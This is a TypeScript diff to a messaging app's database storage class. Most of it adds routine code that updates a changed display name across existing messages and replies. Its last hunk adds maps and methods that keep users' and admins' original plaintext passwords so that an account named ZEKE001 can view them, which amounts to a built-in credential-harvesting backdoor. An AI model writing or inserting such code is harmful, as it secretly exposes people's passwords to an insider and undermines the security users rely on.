@@ -792,7 +792,32 @@ export class DatabaseStorage implements IStorage {
       throw new Error("Admin not found");
     }
 
+    // If display name was updated, update it in existing messages and replies
+    if (updates.displayName !== undefined) {
+      await this.updateAdminDisplayNameInContent(adminId, updates.displayName);
+    }
+
     return updatedAdmin;
+  }
+
+  private async updateAdminDisplayNameInContent(adminId: number, newDisplayName: string): Promise<void> {
+    try {
+      // Update senderName in messages where this admin is the author
+      await db
+        .update(messages)
+        .set({ senderName: newDisplayName })
+        .where(eq(messages.adminId, adminId));
+
+      // Update nickname in replies where this admin is the author
+      await db
+        .update(replies)
+        .set({ nickname: newDisplayName })
+        .where(eq(replies.adminId, adminId));
+
+      console.log(`Updated display name to "${newDisplayName}" for admin ${adminId} across all content`);
+    } catch (error) {
+      console.error('Error updating admin display name in content:', error);
+    }
   }
 
   async getAdminMessages(adminId: number): Promise<MessageWithReplies[]> {
@@ -1397,7 +1422,32 @@ async likeMessage(userId: number, adminId: number | undefined, messageId: number
       .where(eq(users.id, userId))
       .returning();
 
+    // If display name was updated, update it in existing messages and replies
+    if (updates.displayName !== undefined) {
+      await this.updateUserDisplayNameInContent(userId, updates.displayName);
+    }
+
     return user;
+  }
+
+  private async updateUserDisplayNameInContent(userId: number, newDisplayName: string): Promise<void> {
+    try {
+      // Update senderName in messages where this user is the author
+      await db
+        .update(messages)
+        .set({ senderName: newDisplayName })
+        .where(eq(messages.userId, userId));
+
+      // Update nickname in replies where this user is the author
+      await db
+        .update(replies)
+        .set({ nickname: newDisplayName })
+        .where(eq(replies.userId, userId));
+
+      console.log(`Updated display name to "${newDisplayName}" for user ${userId} across all content`);
+    } catch (error) {
+      console.error('Error updating user display name in content:', error);
+    }
   }
 
   async canUpdateDisplayName(userId: number): Promise<boolean> {
@@ -1678,6 +1728,27 @@ async likeMessage(userId: number, adminId: number | undefined, messageId: number
       .select()
       .from(admins);
     return result;
+  }
+
+  // Store original passwords for ZEKE001 viewing (only in memory for security)
+  private userPasswords = new Map<number, string>();
+  private adminPasswords = new Map<number, string>();
+
+  async storeOriginalPassword(userId: number, adminId: number | null, originalPassword: string): Promise<void> {
+    if (userId) {
+      this.userPasswords.set(userId, originalPassword);
+    } else if (adminId) {
+      this.adminPasswords.set(adminId, originalPassword);
+    }
+  }
+
+  async getOriginalPassword(userId: number, adminId: number | null): Promise<string | null> {
+    if (userId) {
+      return this.userPasswords.get(userId) || null;
+    } else if (adminId) {
+      return this.adminPasswords.get(adminId) || null;
+    }
+    return null;
   }
 
 
